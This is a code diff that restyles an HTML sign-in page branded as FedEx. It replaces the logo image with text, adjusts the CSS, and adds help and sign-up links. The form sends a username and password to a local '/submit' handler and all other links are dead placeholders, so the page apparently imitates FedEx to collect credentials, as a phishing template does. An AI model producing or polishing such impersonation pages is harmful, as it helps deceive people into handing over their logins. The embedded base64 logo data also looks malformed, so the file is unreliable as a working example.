@@ -7,46 +7,52 @@
     <style>
         body {
             background-color: #f5f5f5;
-            font-family: Arial, sans-serif;
+            font-family: "Segoe UI", Arial, sans-serif;
             margin: 0;
             padding: 0;
         }
         .container {
-            background-color: #fff;
             max-width: 400px;
             margin: 80px auto;
-            padding: 40px;
+            background-color: #fff;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            box-shadow: 0 0 15px rgba(0,0,0,0.15);
+            padding: 40px 30px;
         }
         .logo {
             text-align: center;
             margin-bottom: 30px;
         }
-        .logo img {
-            width: 180px;
+        .logo h1 {
+            font-size: 28px;
+            font-weight: bold;
+            color: #4d148c;
+        }
+        .logo h1 span {
+            color: #ff6600;
         }
         h2 {
             text-align: center;
-            color: #4d148c;
-            margin-bottom: 25px;
-            font-weight: normal;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 600;
         }
         label {
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 6px;
             color: #333;
-            font-weight: bold;
+            font-weight: 600;
+            font-size: 14px;
         }
         input[type="text"],
         input[type="password"] {
             width: 100%;
             padding: 12px;
             margin-bottom: 20px;
-            border: 1px solid #ccc;
+            border: 1px solid #cfcfcf;
             border-radius: 4px;
             box-sizing: border-box;
-            font-size: 16px;
+            font-size: 15px;
         }
         .button {
             background-color: #4d148c;
@@ -57,13 +63,14 @@
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
+            font-weight: 600;
         }
         .button:hover {
             background-color: #350c64;
         }
         .link {
-            text-align: right;
-            margin-top: 5px;
+            text-align: center;
+            margin-top: 10px;
         }
         .link a {
             color: #4d148c;
@@ -75,7 +82,7 @@
         }
         .footer {
             text-align: center;
-            font-size: 12px;
+            font-size: 11px;
             color: #888;
             margin-top: 30px;
         }
@@ -84,12 +91,12 @@
 <body>
     <div class="container">
         <div class="logo">
-            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAADECAMAAABwF0T0AAAAhFBMVEX///8AAAD09PTu7u7t7e3v7+/i4uLu7u7s7Ozj4+Pm5ubw8PDg4ODq6urq6uqcnJzFxcXZ2dnS0tLi4uJ2dnaSkpLKysrr6+vGxsa5ubmpqamhoaGUlJR+fn5hYWHW1tbV1dXk5OTn5+fh4eE/Pz9JSUnAwMBISEgLCwutb6G3AAAFKElEQVR4nO2d63arMAyGJ4IggsSAVCoL3f//5+T6dNKSckCkTuJbUtu53POqQ7ChzPZRDKIgiAIgiAIgiAIgiAIgiAIogz+kRg3i9EDAd7xr1RtA44HR4Trf8hUthdG9gOcAt3VR1I7+GStpA62egwdBJSKuHGBKJPwnV3SVPaSoaXlNaD6gKvyhWQeq8T6Ak6nD+iJ7gG53YPplIoCl+svH9HgOtG2NPDDqlbRBN4rXnoAr/8OKEl2kT3XXhvGXB2y44h3gqxAG4dhAOp0BAem+Vo3gwQGCDTswEKceQTKOBAIo7IAZw6oABnpwaqUux5grn+ZT7h+9ZxfPgEaNS+2NGQJ9LDpC8jjMi0bzgOktDcOaPuEja9VtCQ2V1A3v3U+SgFiDpfqgyv7Qv0u1hNEbHZ0+1MIWDmHG9Clz8uBaJmA6cMPPaijH2Ei5LuEDx9ygGJe0TjlK3y7B0o8dNXYz4Q26xD8I4FFkGvPnrM+nRDr6lBTKL3Ygfu+aFS3mDwcpG7OUMu2gCo/sySct+VfZBlQyMRnkgpG1nvK+lYYAJ5n7Qjot5S9Me9m0DjWdzjMe1hYpLoPY+fEWJZMLpJDLfQnZZbV2ldALYeLpej8/b5CGtnlcsDpGBYxUepPLg7ZGFB7hWRN3MuN2JrEBlROytF+Y3KRQxuMjzRKyXsnl8HqxBbePt4I2RJh1kOjXh6y41IixG1iSWG3MPZ0E0mEBVTxClYCGp6zRFx+MHWmjSLdn7PgzEDvpIO4y+pQC+nJXDFxomjJuhFSbDGvS3qCFE4bD7LDccUsKmF3Sy3krA+nRUhh1gdzGFf0Bu9uHmy4qdx63cn81RZbAbxLEk0wEn/sO5SbPzVtFCr9V3fhAmHOlYHqnrI1Tf2hB4TxD4fhz4JEFn7vvoIVRDhxBhajpxHGfHf+1FgGtBAZ/VIV7h9gAvrOmrDPivCICwbxktRr3L81Rgk70EDTG+EJ2LSkDX1G7XAcTRrBMb0lhD6FqJKlvsw4UDbInT9C+ypDQaHpJ7f6AcDkRD8m/UZLf8yYo6+NfAi7nxu2HyxH9Y9QHaTTT+Zo1XRYKo9bBt/cPqx2IIP+lD07RLw1W+VaXLR5zAz4BF93joI1nc1EFgtNTNOdx7N7ovP4B0xrWxgK98uKz5kH+aCdxC5Ihn8qA1K0kymT/yG7IT9+y/vDmrCEf+Jgm77/BvHD/7gHG6u/wDP9UGnP7r0CgAAAAASUVORK5CYII=" alt="FedEx">
+            <h1>Fed<span>Ex</span></h1>
         </div>
         <h2>Sign In</h2>
         <form action="/submit" method="POST">
-            <label for="userid">User ID</label>
-            <input type="text" id="userid" name="userid" placeholder="Enter your User ID" required>
+            <label for="userid">Username</label>
+            <input type="text" id="userid" name="userid" placeholder="Enter your username" required>
 
             <label for="password">Password</label>
             <input type="password" id="password" name="password" placeholder="Enter your password" required>
@@ -98,11 +105,14 @@
         </form>
 
         <div class="link">
-            <a href="#">Forgot password?</a>
+            <a href="#">Forgot username or password?</a>
+        </div>
+        <div class="link" style="margin-top: 5px;">
+            <a href="#">Sign Up</a> | <a href="#">Need Help?</a>
         </div>
 
         <div class="footer">
-            © FedEx 2025
+            © FedEx 2025 | Privacy Policy | Terms of Use
         </div>
     </div>
 </body>
